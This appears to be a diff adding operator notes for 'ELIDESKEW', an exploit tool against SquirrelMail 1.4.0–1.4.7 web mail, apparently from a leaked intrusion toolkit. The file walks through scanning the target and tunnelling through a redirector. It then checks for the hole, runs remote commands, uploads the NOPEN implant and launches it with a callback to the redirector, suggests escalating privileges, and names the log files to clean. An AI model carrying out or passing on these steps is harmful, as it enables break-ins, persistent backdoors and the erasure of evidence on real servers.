@@ -1,0 +1,84 @@
+#########################################################
+# ELIDESKEW v1.0.0.1 
+#########################################################
+### Public known vulnerablity in SquirrelMail versions 1.4.0 - 1.4.7
+### Patched for versions => 1.4.8
+### Tested on CentOS and FreeBSD successfully
+### will be apache on target; use approprate tool( if available)  to elevate
+
+
+mx
+:%s/REDIRECTOR_IP/REDIRECTOR_IP/g
+:%s/TARGET_IP/TARGET_IP/g
+:%s/RANDOM_PORT/RANDOM_PORT/g
+`x
+
+### scan port 80 to look for squirrel banner ( may report version; needs to
+### be version 1.4.0 - 1.4.7 to work)
+### need banner to help determine squirrel mail dir
+-scan http TARGET_IP
+
+
+### set up redirection
+### on redirector
+-tunnel
+l 80 TARGET_IP
+
+## get ELIDESKEW usage
+## scripted local window
+cd /current/bin
+
+./elideskew.pl 
+                -ch            - Check forexploit        
+                -l [file]      - File to upload
+                -r [path]      - Upload destination path/filename
+                -c [String]    - Command Line to execute, if you want
+                               to use the file just uploded, then INCLUDE IT.
+                -u [url]       - http://host.com/squirrelMail/
+                               get from http banner eg. /webapps/sq147 
+
+## test for exploit vulnerability
+## local scripted window
+./elideskew.pl  -u http://127.0.0.1/webapps/sq147 -ch
+
+### will report YES ( with OS) or NO 
+### sample good output
+###Checking... 
+
+###Linux webapps.jetson.net 2.6.9-42.ELsmp #1 SMP Sat Aug 12 09:39:11 CDT 2006
+i686 i686 i386 GNU/Linux
+
+###YES!
+
+### If vulnerable; proceed; run commands on target to find dir read/writeable by apache
+
+./elideskew.pl  -u http://127.0.0.1/webapps/sq147 -c 'uname -a; w; pwd; ls -al
+../data'
+
+
+### note pwd result; /var/www/html/webapps/sq147/src (default dir) is not writeable/executable by apache but ../data is....
+
+### Ready to upload and execute NOPEN
+
+### on REDIRECTOR_IP
+-nrtun RANDOM_PORT
+
+
+### local scripted window  [[ note: the backticks "`" may or may not be necessary ]]
+./elideskew.pl  -u http://127.0.0.1/webapps/sq147 -l /current/up/morerats/noserver-3.0.3.6-i686.pc.linux.gnuoldld.redhat-6.0 -r /var/www/html/webapps/sq147/data/nos -c '`D=-cREDIRECTOR_IP:RANDOM_PORT /var/www/html/webapps/sq147/data/nos`'
+
+### if all goes well you will be apache on target (note: some apache configurations run
+	as nobody)
+
+need to elevate; choose appropriate tool
+
+### cleaning logs
+
+Logging varies by platform: 
+  
+on CentOS - /var/log/httpd/error_log ; CentOS runs SELinux so it also logs when nopen
+	tries to call back in /var/log/messages.  CentOS will not allow nopen to bind
+	to a port as a server so must use callback mode for nopen
+
+on FreeBSD - [APACHE_PREFIX]/logs/error_log
+
